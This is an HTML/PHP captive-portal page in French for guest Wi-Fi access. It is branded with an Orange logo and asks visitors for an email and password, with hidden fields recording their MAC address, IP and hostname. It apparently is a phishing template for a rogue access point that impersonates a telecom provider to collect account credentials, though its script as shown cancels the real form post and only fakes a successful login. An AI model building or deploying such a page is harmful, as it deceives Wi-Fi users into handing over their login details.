<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portail Captif - Accès invité</title>

<!-- Milligram CSS (offline) -->
<link rel="stylesheet" href="/milligram-1.4.1/dist/milligram.min.css">

<style>
/* === Body & Background === */
body {
  overflow: hidden;
  background: #111;
  color: white;
  font-family: 'Arial', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
  padding: 1rem;
}

/* Radial gradient background animation */
body::before {
  content: "";
  position: fixed;
  top: 0; left: 0; width: 100%; height: 100%;
  background: radial-gradient(circle at 25% 25%, rgba(255,122,0,0.12), transparent 25%),
              radial-gradient(circle at 75% 75%, rgba(255,178,107,0.08), transparent 25%);
  z-index: -3;
  animation: bgFloat 12s ease-in-out infinite alternate;
}
@keyframes bgFloat {
  0% { transform: translate(0,0) rotate(0deg); }
  50% { transform: translate(20px,-10px) rotate(5deg); }
  100% { transform: translate(0,10px) rotate(0deg); }
}

/* === Animations === */
@keyframes fadeIn { from {opacity:0; transform: translateY(20px);} to {opacity:1; transform: translateY(0);} }
.animate-fadeIn { animation: fadeIn 0.6s ease-out forwards; }

.loader {
  width: 18px;
  height: 18px;
  border-radius: 50%;
  border: 3px solid rgba(255,255,255,0.2);
  border-top-color: white;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

.success-burst {
  position: absolute;
  inset: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  pointer-events: none;
  opacity: 0;
  transform: scale(0.95);
  transition: opacity .2s ease, transform .4s cubic-bezier(.2,.9,.3,1);
}
.success-burst.show {
  opacity: 1;
  transform: scale(1);
}

/* === Card === */
.card-3d {
  background: rgba(30,30,30,0.8);
  backdrop-filter: blur(6px);
  border-radius: 1rem;
  padding: 2rem;
  max-width: 400px;
  width: 100%;
  box-shadow: 0 8px 24px rgba(0,0,0,0.6);
  transition: transform 0.1s ease-out;
  will-change: transform;
  position: relative;
  z-index: 10;
}

/* === Form Elements === */
input[type="email"], input[type="password"] {
  width: 100%;
  padding: 0.75rem 1rem;
  border-radius: 0.5rem;
  border: 1px solid #444;
  background: rgba(50,50,50,0.8);
  color: white;
  margin-bottom: 1rem;
}

label {
  display: block;
  margin-bottom: 0.25rem;
  font-size: 0.9rem;
  color: #aaa;
}

button {
  cursor: pointer;
  border: none;
}

button.primary {
  width: 100%;
  padding: 0.75rem;
  background-color: #ff7a00;
  color: #111;
  font-weight: bold;
  border-radius: 0.5rem;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 0.5rem;
  transition: background 0.2s ease;
}
button.primary:hover { background-color: #cc5e00; }

button.secondary {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #666;
  color: #ccc;
  border-radius: 0.5rem;
  margin-top: 0.5rem;
}
button.secondary:hover {
  border-color: #ff7a00;
  color: #fff;
}

/* === Orbs === */
.orb {
  position: absolute;
  width: 15px;
  height: 15px;
  border-radius: 50%;
  background: radial-gradient(circle, #ff7a00 0%, #ffb26b 80%);
  pointer-events: none;
  z-index: 5;
  opacity: 0.8;
}
</style>
</head>
<body>

<!-- Success Animation -->
<div id="successBurst" class="success-burst">
  <div style="width:96px; height:96px; border-radius:50%; background: linear-gradient(45deg,#ff7a00,#ffb26b); display:flex; justify-content:center; align-items:center; font-size:2.5rem; font-weight:bold; color:#111;">✓</div>
</div>

<!-- Orbs Container -->
<div id="orbsContainer"></div>

<!-- Card -->
<div id="card" class="card-3d animate-fadeIn">

  <!-- Logo -->
  <div style="text-align:center; margin-bottom:1rem;">
    <img src="assets/orange_logo.png" alt="Logo" style="width:128px; height:auto; border:2px solid #ff7a00; border-radius:8px;">
  </div>

  <h1 style="text-align:center; font-size:1.8rem; font-weight:bold; color:#ff7a00; margin-bottom:0.5rem;">Accès Wi‑Fi invité</h1>
  <p style="text-align:center; color:#ccc; margin-bottom:1.5rem;">Connectez-vous avec identifiants pour accéder à Internet en toute sécurité.</p>

  <form id="loginForm" method="POST" action="/captiveportal/index.php">
    <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
    <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
    <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
    <input type="hidden" name="target" value="<?=$destination?>">

    <label for="email">Adresse e-mail</label>
    <input type="email" name="email" id="email" required>

    <label for="password">Mot de passe</label>
    <div style="position:relative;">
      <input type="password" name="password" id="password" required style="padding-right:2.5rem;">
      <button type="button" id="togglePw" style="position:absolute; top:0.5rem; right:0.5rem; background:none; color:#aaa; font-size:1rem;">👁️</button>
    </div>

    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
      <label style="font-size:0.85rem; color:#ccc;">
        <input type="checkbox" name="remember" style="margin-right:0.25rem;"> Se souvenir de moi
      </label>
      <a href="#" style="color:#ff7a00; font-size:0.85rem; text-decoration:underline;">Besoin d'aide ?</a>
    </div>

    <button type="submit" id="submitBtn" class="primary">
      <span id="btnLabel">Se connecter</span>
      <span id="btnLoader" style="display:none;"><span class="loader"></span></span>
    </button>

    <button type="button" id="guestBtn" class="secondary">Connexion invitée</button>

    <p style="text-align:center; color:#888; font-size:0.75rem; margin-top:1rem;">En vous connectant, vous acceptez les conditions d'utilisation du réseau local.</p>
  </form>
</div>

<script>
const togglePw = document.getElementById('togglePw');
const password = document.getElementById('password');
const form = document.getElementById('loginForm');
const guestBtn = document.getElementById('guestBtn');
const submitBtn = document.getElementById('submitBtn');
const btnLabel = document.getElementById('btnLabel');
const btnLoader = document.getElementById('btnLoader');
const successBurst = document.getElementById('successBurst');
const card = document.getElementById('card');
const orbsContainer = document.getElementById('orbsContainer');

// Create Orbs
const orbs = [];
for(let i=0;i<8;i++){
  const orb = document.createElement('div');
  orb.className = 'orb';
  orb.style.left = `${Math.random()*100}%`;
  orb.style.top = `${Math.random()*100}%`;
  orbsContainer.appendChild(orb);
  orbs.push(orb);
}

// Toggle password visibility
togglePw.addEventListener('click', () => {
  if(password.type === 'password') { password.type = 'text'; togglePw.textContent = '🙈'; }
  else { password.type = 'password'; togglePw.textContent = '👁️'; }
});

// Form submission
form.addEventListener('submit', (e) => {
  e.preventDefault();
  btnLoader.style.display = 'inline-block';
  btnLabel.textContent = 'Connexion...';
  submitBtn.disabled = true;

  setTimeout(()=> {
    successBurst.classList.add('show');
    btnLoader.style.display = 'none';
    btnLabel.textContent = 'Connecté';
    setTimeout(()=> {
      const target = document.querySelector('input[name="target"]').value || '/';
      window.location.href = target;
    }, 900);
  }, 1200);
});

// Guest button
guestBtn.addEventListener('click', () => {
  btnLoader.style.display = 'inline-block';
  btnLabel.textContent = 'Connexion invitée...';
  submitBtn.disabled = true;

  setTimeout(()=> {
    successBurst.classList.add('show');
    btnLoader.style.display = 'none';
    btnLabel.textContent = 'Connecté (invité)';
    setTimeout(()=> { window.location.href = '/'; }, 900);
  }, 900);
});

// 3D Card & Orbs effect
function updateEffect(x,y){
  card.style.transform = `rotateX(${x}deg) rotateY(${y}deg)`;
  orbs.forEach((orb,i)=>{
    const offset = 10 + i*2;
    orb.style.transform = `translate(${y*offset}px, ${x*offset}px)`;
  });
}

window.addEventListener('mousemove', e => {
  const cx = window.innerWidth/2;
  const cy = window.innerHeight/2;
  const dx = (e.clientX - cx)/cx;
  const dy = (e.clientY - cy)/cy;
  updateEffect(dy*10, dx*10);
});

window.addEventListener('deviceorientation', e => {
  const x = e.beta ? (e.beta - 45)/45*10 : 0;
  const y = e.gamma ? (e.gamma)/45*10 : 0;
  updateEffect(x, y);
});
</script>

</body>
</html>
